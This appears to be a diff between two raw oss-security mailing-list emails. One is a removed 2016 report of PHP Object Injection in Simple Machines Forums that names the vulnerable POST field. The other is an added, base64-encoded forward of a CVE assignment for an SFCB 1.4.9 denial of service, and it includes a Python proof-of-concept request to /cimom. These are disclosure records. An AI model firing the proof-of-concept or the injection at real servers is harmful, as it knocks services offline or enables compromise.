@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1377" "Friday" "10" "June" "2016" "13:56:14" "-0400" "Scott Arciszewski" "scott@paragonie.com" "<CAKws9z0qx_7spQTw9Z3vrV1hRa8so=G-1T7eegnLuMzTp0H59Q@mail.gmail.com>" "37" "[oss-security] Simple Machines Forums - PHP Object Injection" "^Date:" nil nil "6" "2016061017:56:14" "[oss-security] Simple Machines Forums - PHP Object Injection" (number mark "        scott@parago Jun 10   37/1377  " thread-indent "\"[oss-security] Simple Machines Forums - PHP Object Injection\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["5145" "Wednesday" "7" "February" "2018" "13:04:18" "+0800" "XinleiHe" "hxl1999@yeah.net" "<3f4673f3.2322.1616ea675cc.Coremail.hxl1999@yeah.net>" "89" "[oss-security] Fw:Re: [scr459004] sfcb - 1.4.9" nil nil nil "2" "2018020705:04:18" "[oss-security] Fw:Re: [scr459004] sfcb - 1.4.9" (number mark "U       hxl1999@yeah Feb  7   89/5145  " thread-indent "\"[oss-security] Fw:Re: [scr459004] sfcb - 1.4.9\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 9521 invoked by uid 550); 10 Jun 2016 17:57:25 -0000
+Received: (qmail 5447 invoked by uid 550); 7 Feb 2018 06:32:19 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,73 +11,118 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 7421 invoked from network); 10 Jun 2016 17:56:26 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=paragonie-com.20150623.gappssmtp.com; s=20150623;
-        h=mime-version:date:message-id:subject:from:to;
-        bh=QokUV4kiRADaCwtRsZbtOuYtwFQNH15ap/BWLmGhpVs=;
-        b=JxtCn7OkeFEcCK5YapSuw1hefeIUj6JsztzcryouvHqUDcePq32Uh8kLpX1Z/OLMHr
-         rNinG/4uEUVQZSDzKoRUZI5Ff2y9DcclLPBSvnF+TqRqGoEYuWSuNcz2l84BfLyzlC2P
-         W0H3FbHfBiZ+flfydhL5aFsA9LkttOHvU3PgMBmKfIeiYk8NS4yGTMKN5SgvjIGTiiPk
-         tlCoc3D3se29SSUE3PkB/zOrb2DY4ldThJmdlAvZdr/HtZ2EeJO/ncl/AW6f6s8tEbgi
-         nr9cVMZ3roMYg3Rk4z55sV0w0o+WMtM7eYyyOJhFmZAqy8mmG09dsbREazZd4lExRBB8
-         uX1g==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20130820;
-        h=x-gm-message-state:mime-version:date:message-id:subject:from:to;
-        bh=QokUV4kiRADaCwtRsZbtOuYtwFQNH15ap/BWLmGhpVs=;
-        b=gmzwfwomga4W76ivHd5KQq5h5JEmeInOgUWgZZ4jljdQ/BBzMYl1Jj2EhoKpoguBB2
-         2vep1wml2Ah0Su4Xtav0xndLYj91Xq/TkjZzKUqIwFISB3fVm8mkZi79kQ9lQ5fzU5L2
-         TifPXv3yn9L5RIinlMPkFbN0BCzh5VMhMsv44RVOIeW+a0UZSgCHo+MAyQ+jcf0q91xp
-         Qa79fhpM9IOCNmEr8pLUBKJoAMbpyiiEhp7qJysksB1RcblQQ2/4zgZkhA6L7rWiH+an
-         XZW+hJ2tQ1SzbLjkdAf6YEezJo7SIMea3GYjaqSPWL38JCtPBoR6aLUFsyl6rI/vEXwk
-         R4tQ==
-X-Gm-Message-State: ALyK8tIU4eQEfz+r285eUbXXQ+blUSW/mn3sF44e3pDqdB8o3ki/OVcIe7Mi5i/w6ity7f3jk9kBtflYpiPGLQ==
-MIME-Version: 1.0
-X-Received: by 10.202.214.15 with SMTP id n15mr1711581oig.106.1465581374759;
- Fri, 10 Jun 2016 10:56:14 -0700 (PDT)
-Message-ID: <CAKws9z0qx_7spQTw9Z3vrV1hRa8so=G-1T7eegnLuMzTp0H59Q@mail.gmail.com>
-Content-Type: multipart/alternative; boundary=001a113b04543b80d80534f041cd
-Date: Fri, 10 Jun 2016 13:56:14 -0400
-From: Scott Arciszewski <scott@paragonie.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] Simple Machines Forums - PHP Object Injection
+Received: (qmail 17705 invoked from network); 7 Feb 2018 05:04:34 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=yeah.net;
+	s=s110527; h=Date:From:Subject:MIME-Version:Message-ID; bh=XGCAX
+	MIyQx8cH5KQAZgCEn7Pap0U3uvmnvioQYmZ1Ww=; b=U2UA/ptAQ5dhvdSpP4Yy4
+	RUv5SmCI7tf1EEmPdcN6rCCdxYcyf4PElWc8pOd6oB1TzkESr2StALpbavASfwcd
+	57ZrX5gII6Gs9ethuz3/2nJjjMnrVzuUnTPiC68ZqwMAof4K7yJ9eeFH/tTh12PZ
+	6qd7v8ZoTRImc8HFZShsF8=
+X-Originating-IP: [125.71.204.103]
+Date: Wed, 7 Feb 2018 13:04:18 +0800 (CST)
+X-CM-HeaderCharset: UTF-8
+From: XinleiHe  <hxl1999@yeah.net>
 To: oss-security@lists.openwall.com
+X-Priority: 3
+X-Mailer: Coremail Webmail Server Version SP_ntes V3.5 build
+ 20160729(86883.8884) Copyright (c) 2002-2018 www.mailtech.cn yeah
+Content-Type: multipart/alternative; 
+	boundary="----=_Part_35424_57348258.1517979858379"
+MIME-Version: 1.0
+Message-ID: <3f4673f3.2322.1616ea675cc.Coremail.hxl1999@yeah.net>
+X-Coremail-Locale: zh_CN
+X-CM-TRANSID:rXygCgCXz5bTiHpa8G1UAA--.7548W
+X-CM-SenderInfo: 5k0oimyzz65vtdko0vbw/1tbiDhPlT1H7jEQtuQAAsB
+X-Coremail-Antispam: 1U5529EdanIXcx71UUUUU7vcSsGvfC2KfnxnUU==
+Subject: [oss-security] Fw:Re: [scr459004] sfcb - 1.4.9
 
---001a113b04543b80d80534f041cd
+------=_Part_35424_57348258.1517979858379
 Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: base64
 
-I reported the following PHP Object Injection vulnerabilities to the SMF
-development team on March 9, 2016:
+CgoKCgoKCgoKCi0tLS0tLS0tIEZvcndhcmRpbmcgbWVzc2FnZXMgLS0tLS0t
+LS0KRnJvbTogY3ZlLXJlcXVlc3RAbWl0cmUub3JnCkRhdGU6IDIwMTgtMDIt
+MDYgMDQ6MTE6NTUKVG86ICBoeGwxOTk5QHllYWgubmV0CkNjOiAgY3ZlLXJl
+cXVlc3RAbWl0cmUub3JnClN1YmplY3Q6IFJlOiBbc2NyNDU5MDA0XSBzZmNi
+IC0gMS40LjkKLS0tLS1CRUdJTiBQR1AgU0lHTkVEIE1FU1NBR0UtLS0tLQpI
+YXNoOiBTSEEyNTYKClRoZSBDVkUgSUQgaXMgYmVsb3cuIFBsZWFzZSBpbmZv
+cm0gdGhlIHNvZnR3YXJlIG1haW50YWluZXIgdGhhdCB0aGUKQ1ZFIElEIGhh
+cyBiZWVuIGFzc2lnbmVkLgoKCj4gW1N1Z2dlc3RlZCBkZXNjcmlwdGlvbl0K
+PiBTQkxJTSBTbWFsbCBGb290cHJpbnQgQ0lNIEJyb2tlciAoU0ZDQikgMS40
+LjkgaGFzIGEKPiBudWxsIHBvaW50ZXIgKERvUykgdnVsbmVyYWJpbGl0eSB2
+aWEKPiBhIGNyYWZ0ZWQgUE9TVCByZXF1ZXN0IHRvIHRoZSAvY2ltb20gVVJJ
+Lgo+IAo+IC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLQo+IAo+IFtBZGRpdGlvbmFsIEluZm9ybWF0aW9uXQo+IFlvdSBjYW4g
+dXNlIGZvbGxvd2luZyBweXRob24gY29kZSB0byByZXByb2R1Y2UgdGhpcyB2
+dWxuZXJhYmlsaXR5Lgo+IAo+IGltcG9ydCBodHRwbGliCj4gZnJvbSB4bWwu
+ZG9tLm1pbmlkb20gaW1wb3J0IERvY3VtZW50Cj4gY2xhc3Mgd3JpdGVfeG1s
+KERvY3VtZW50KToKPiAgICAgZGVmIF9faW5pdF9fKHNlbGYpOgo+IAo+ICAg
+ICAgICAgRG9jdW1lbnQuX19pbml0X18oc2VsZikKPiAgCj4gICAgIGRlZiBz
+ZXRfdGFnKHNlbGYsdGFnKToKPiAgICAgICAgIHNlbGYudGFnID0gdGFnCj4g
+ICAgICAgICBzZWxmLmNpbSA9IHNlbGYuY3JlYXRlRWxlbWVudChzZWxmLnRh
+ZykKPiAgICAgICAgICNzZWxmLnNldEF0dHJpYnV0ZSgiZW5jb2RpbmciLCAi
+dXRmLTgiKQo+ICAgICAgICAgCj4gICAgICAgICBzZWxmLmNpbS5zZXRBdHRy
+aWJ1dGUoIkNJTVZFUlNJT04iLCAiMi4wIikKPiAgICAgICAgIHNlbGYuY2lt
+LnNldEF0dHJpYnV0ZSgiRFREVkVSU0lPTiIsICIyLjAiKQo+ICAgICAgICAg
+c2VsZi5hcHBlbmRDaGlsZChzZWxmLmNpbSkKPiAKPiAgICAgICAgIHNlbGYu
+bXNnID0gc2VsZi5jcmVhdGVFbGVtZW50KCJNRVNTQUdFIikKPiAgICAgICAg
+IHNlbGYubXNnLnNldEF0dHJpYnV0ZSgiSUQiLCAiNDcxMSIpCj4gICAgICAg
+ICBzZWxmLm1zZy5zZXRBdHRyaWJ1dGUoIlBST1RPQ09MVkVSU0lPTiIsIjEu
+MCIpCj4gICAgICAgICBzZWxmLmNpbS5hcHBlbmRDaGlsZChzZWxmLm1zZykK
+PiAKPiAgICAgICAgIHNlbGYuc2ltID0gc2VsZi5jcmVhdGVFbGVtZW50KCJT
+SU1QTEVSRVEiKQo+ICAgICAgICAgc2VsZi5tc2cuYXBwZW5kQ2hpbGQoc2Vs
+Zi5zaW0pCj4gCj4gICAgICAgICBzZWxmLmltZSA9IHNlbGYuY3JlYXRlRWxl
+bWVudCgiSU1FVEhPRENBTEwiKQo+ICAgICAgICAgc2VsZi5pbWUuc2V0QXR0
+cmlidXRlKCJOQU1FIiwiRW51bWVyYXRlSW5zdGFuY2VzIikKPiAgICAgICAg
+IHNlbGYuc2ltLmFwcGVuZENoaWxkKHNlbGYuaW1lKQo+IAo+ICAgICAgICAg
+c2VsZi5sb2NhbCA9IHNlbGYuY3JlYXRlRWxlbWVudCgiTE9DQUxOQU1FU1BB
+Q0VQQVRIIikKPiAgICAgICAgIHNlbGYuaW1lLmFwcGVuZENoaWxkKHNlbGYu
+bG9jYWwpCj4gICAgICAgICAgIAo+ICAgICAgICAgc2VsZi5uYW1lczE9c2Vs
+Zi5jcmVhdGVFbGVtZW50KCJOQU1FU1BBQ0UiKQo+ICAgICAgICAgc2VsZi5u
+YW1lczEuc2V0QXR0cmlidXRlKCJOQU1FIiwgInJvb3QiKQo+ICAgICAgICAg
+c2VsZi5sb2NhbC5hcHBlbmRDaGlsZChzZWxmLm5hbWVzMSkKPiAKPiAgICAg
+ZGVmIGRpc3BsYXkoc2VsZik6Cj4gICAgICAgICBwcmludCBzZWxmLnRvcHJl
+dHR5eG1sKGluZGVudD0iICAgIikKPiAgICAgZGVmIHJldGRhdGEoc2VsZik6
+Cj4gICAgICAgICByZXR1cm4gc2VsZi50b3ByZXR0eXhtbChpbmRlbnQ9IiAg
+ICIpCj4gCj4gZGVmIGh0dHByZXEoZGF0YSk6Cj4gIGNvbm4gPSBodHRwbGli
+LkhUVFBDb25uZWN0aW9uKCIxMjcuMC4wLjEiLCA1OTg4LCBGYWxzZSkKPiAg
+Y29ubi5yZXF1ZXN0KCdQT1NUJywgJy9jaW1vbScsZGF0YSkKPiAgcmVzID0g
+Y29ubi5nZXRyZXNwb25zZSgpIAo+IAo+IGRlZiBtYWluKCk6IAo+ICB3eCA9
+IHdyaXRlX3htbCgpCj4gIHd4LnNldF90YWcoJ0NJTScpCj4gIHByaW50IHd4
+LnJldGRhdGEoKQo+ICBwcmludCBodHRwcmVxKHd4LnJldGRhdGEoKSkKPiAK
+PiBpZiBfX25hbWVfXz09J19fbWFpbl9fJzoKPiAgbWFpbigpCj4gCj4gLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCj4gCj4g
+W1Z1bG5lcmFiaWxpdHkgVHlwZV0KPiBCdWZmZXIgT3ZlcmZsb3cKPiAKPiAt
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KPiAK
+PiBbVmVuZG9yIG9mIFByb2R1Y3RdCj4gU0JMSU0gcHJvamVjdAo+IAo+IC0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQo+IAo+
+IFtBZmZlY3RlZCBQcm9kdWN0IENvZGUgQmFzZV0KPiBzZmNiIC0gMS40LjkK
+PiAKPiAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0KPiAKPiBbSW1wYWN0IERlbmlhbCBvZiBTZXJ2aWNlXQo+IHRydWUKClVz
+ZSBDVkUtMjAxOC02NjQ0LgoKCi0gLS0gCkNWRSBBc3NpZ25tZW50IFRlYW0K
+TS9TIE0zMDAsIDIwMiBCdXJsaW5ndG9uIFJvYWQsIEJlZGZvcmQsIE1BIDAx
+NzMwIFVTQQpbIEEgUEdQIGtleSBpcyBhdmFpbGFibGUgZm9yIGVuY3J5cHRl
+ZCBjb21tdW5pY2F0aW9ucyBhdAogIGh0dHA6Ly9jdmUubWl0cmUub3JnL2N2
+ZS9yZXF1ZXN0X2lkLmh0bWwgXQotLS0tLUJFR0lOIFBHUCBTSUdOQVRVUkUt
+LS0tLQpWZXJzaW9uOiBHbnVQRyB2MQoKaVFJY0JBRUJDQUFHQlFKYWVMb3JB
+QW9KRUhiL013V0xWaGkyeGRvUC8yT2FLeVF6SWF0UkFCa0IzNUlsellwUgp2
+a2p0REE4dVhqTUljbnVKci9zWWEvelZGaklCUkZRMm5MUmtKczJkNU5pMXVO
+c1ozaEdtNUE3VG4zUkZzRWJ5CnRMNkN2dFk4aDBNQmY0eGY2WlZka3p3c2hK
+eWIwNXFhT0I3VWZVTDVGc2t6b3h2czJRcGNiR0tHdGJ0YUtiUFUKWVpxNHQ2
+YUl5Wlc5VU1Fd2hlZUNCRHpHcUMvb0xWUlV4Z3p0Z0F5OFNJaElsVmZ3dFlF
+bUh2YWZzMTFjTjJYVgpFalZ2SWJhT2VSbE9mZWxKdmxTS0NPakhqMHZqT2Vz
+b3VpR2xNTG0zbnFZWG01ZW4vVDY2dHVDcGFham40enpPCkkvV2owRm04dG0y
+dzBwa2RmY05CZXdMdTcrNGJqUnNpSjhVMFNWUEZRYU9FTnZLN0MzcTZOeXJm
+Q2dzMXFlc1IKZnI0TFM5VGZPY3V1SWp4bjl3M1QwSHI0bk9BSm5Td1Rpd21u
+dUtvUWJsQS9Qbi9yOENxdXlLaC9SaC9TVDZQNwpZeExVdDlaelhLZjJTbFdW
+MXErNjhOOVJ2ZWZvWFFGZ1FkQVAyZVVHMFkyaThBQ1pteENQVkxNY2x3VUh2
+WUlHCktGbGVpMmJJcDRJQUR0M3pSZG5kUUJ6RUsxTndGaE53SUtTbkU3eWJS
+UXFGeDZ5VGdvRWlPUDBDcFlaTG1ScWkKZzk0cHZ1blNCS3FQY0NOaFcvQzc4
+b3JPMFR6N1VlZ25rYUJNTllnSWdXL2pDRkVpRkdTQmdpNFZJalc4V1dycgpN
+K0JNL1VHZWhSQmJHam1ScXBoc09CSGRjMUg5VktVQVdKMFk0aHpRQWQ1WTZR
+Q2NUV2IwdU1sYk5NaklOc2hSCjRUTmJDRlBmNUVXSnk3Qnc4R2ljCj1xNXd5
+Ci0tLS0tRU5EIFBHUCBTSUdOQVRVUkUtLS0tLQo=
 
-https://github.com/SimpleMachines/SMF2.1/blob/404fd5347951652624dfb72304ee38fcab98378f/Sources/Packages.php#L863-L873
+------=_Part_35424_57348258.1517979858379--
 
-https://github.com/SimpleMachines/SMF2.1/blob/19ee85ff8761b792ea3e9ed630a947f45f93ee68/Sources/LogInOut.php#L125-L129
-
-In the first case, you can achieve PHP Object Injection by sending
-themechanges[]=serialized+object+here in the POST data of an HTTP request.
-
-It looks like someone had attempted to find+replace all the obvious PHP
-Object Injection issues (i.e. unserialize($_POST['foo'])) at some point,
-but they didn't look for variables directly derived from user input.
-(foreach ($_POST['foo'] as $bar)).
-
-I've sent follow-up emails to the development team but was never notified
-of any progress towards fixing it.
-
-The first one appears to have been fixed in the release-2.1 branch, but the
-other one still exists.
-
-https://github.com/SimpleMachines/SMF2.1/blob/release-2.1/Sources/Packages.php#L872-L882
-is fixed
-
-https://github.com/SimpleMachines/SMF2.1/blob/release-2.1/Sources/LogInOut.php#L125-L129
-is unfixed
-
-That's all from me.
-
-Scott Arciszewski
-Chief Development Officer
-Paragon Initiative Enterprises <https://paragonie.com>
-
---001a113b04543b80d80534f041cd--
